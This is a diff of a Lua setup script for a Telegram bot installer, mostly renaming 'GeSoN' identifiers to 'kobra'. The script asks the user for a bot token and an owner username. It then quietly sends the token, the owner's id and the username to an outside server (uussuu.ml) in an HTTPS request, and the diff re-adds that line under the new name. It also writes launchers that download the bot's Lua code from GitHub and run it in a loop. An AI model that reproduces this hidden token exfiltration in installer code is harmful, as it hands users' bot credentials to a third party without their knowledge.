@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_GeSoN = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_GeSoN = function() 
+Server_kobra = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_kobra = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local GeSoN_Info_Sudo = io.open("sudo.lua", 'w')
-GeSoN_Info_Sudo:write([[
+local kobra_Info_Sudo = io.open("sudo.lua", 'w')
+kobra_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-GeSoN_Info_Sudo:close()
+kobra_Info_Sudo:close()
 end  
-if not database:get(Server_GeSoN.."Token_GeSoN") then
+if not database:get(Server_kobra.."Token_kobra") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_GeSoN.."Token_GeSoN",token)
+database:set(Server_kobra.."Token_kobra",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_GeSoN.."UserName_GeSoN") then
+if not database:get(Server_kobra.."UserName_kobra") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_GeSoN.."UserName_GeSoN",Json.Info.Username)
-database:set(Server_GeSoN.."Id_GeSoN",Json.Info.Id)
+database:set(Server_kobra.."UserName_kobra",Json.Info.Username)
+database:set(Server_kobra.."Id_kobra",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_GeSoN_Info()
-Create_Info(database:get(Server_GeSoN.."Token_GeSoN"),database:get(Server_GeSoN.."Id_GeSoN"),database:get(Server_GeSoN.."UserName_GeSoN"))   
-https.request("https://uussuu.ml/GeSoN/GeSoN.php?id="..database:get(Server_GeSoN.."Id_GeSoN").."&user="..database:get(Server_GeSoN.."UserName_GeSoN").."&token="..database:get(Server_GeSoN.."Token_GeSoN"))
-local RunGeSoN = io.open("GeSoN", 'w')
-RunGeSoN:write([[
+local function Files_kobra_Info()
+Create_Info(database:get(Server_kobra.."Token_kobra"),database:get(Server_kobra.."Id_kobra"),database:get(Server_kobra.."UserName_kobra"))   
+https.request("https://uussuu.ml/kobra/kobra.php?id="..database:get(Server_kobra.."Id_kobra").."&user="..database:get(Server_kobra.."UserName_kobra").."&token="..database:get(Server_kobra.."Token_kobra"))
+local Runkobra = io.open("kobra", 'w')
+Runkobra:write([[
 #!/usr/bin/env bash
-cd $HOME/GeSoN
-token="]]..database:get(Server_GeSoN.."Token_GeSoN")..[["
-rm -fr GeSoN.lua
-wget "https://raw.githubusercontent.com/Source-Becca/GeSoN/master/GeSoN.lua"
+cd $HOME/kobra
+token="]]..database:get(Server_kobra.."Token_kobra")..[["
+rm -fr kobra.lua
+wget "https://raw.githubusercontent.com/Source-Becca/kobra/master/kobra.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./GeSoN.lua -p PROFILE --bot=$token
+./tg -s ./kobra.lua -p PROFILE --bot=$token
 done
 ]])
-RunGeSoN:close()
+Runkobra:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/GeSoN
+cd $HOME/kobra
 while(true) do
 rm -fr ../.telegram-cli
-screen -S GeSoN -X kill
-screen -S GeSoN ./GeSoN
+screen -S kobra -X kill
+screen -S kobra ./kobra
 done
 ]])
 RunTs:close()
 end
-Files_GeSoN_Info()
-database:del(Server_GeSoN.."Token_GeSoN");database:del(Server_GeSoN.."Id_GeSoN");database:del(Server_GeSoN.."UserName_GeSoN")
+Files_kobra_Info()
+database:del(Server_kobra.."Token_kobra");database:del(Server_kobra.."Id_kobra");database:del(Server_kobra.."UserName_kobra")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_GeSoN()  
+AutoFiles_kobra()  
 var = true
 else   
 f:close()  
-database:del(Server_GeSoN.."Token_GeSoN");database:del(Server_GeSoN.."Id_GeSoN");database:del(Server_GeSoN.."UserName_GeSoN")
+database:del(Server_kobra.."Token_kobra");database:del(Server_kobra.."Id_kobra");database:del(Server_kobra.."UserName_kobra")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
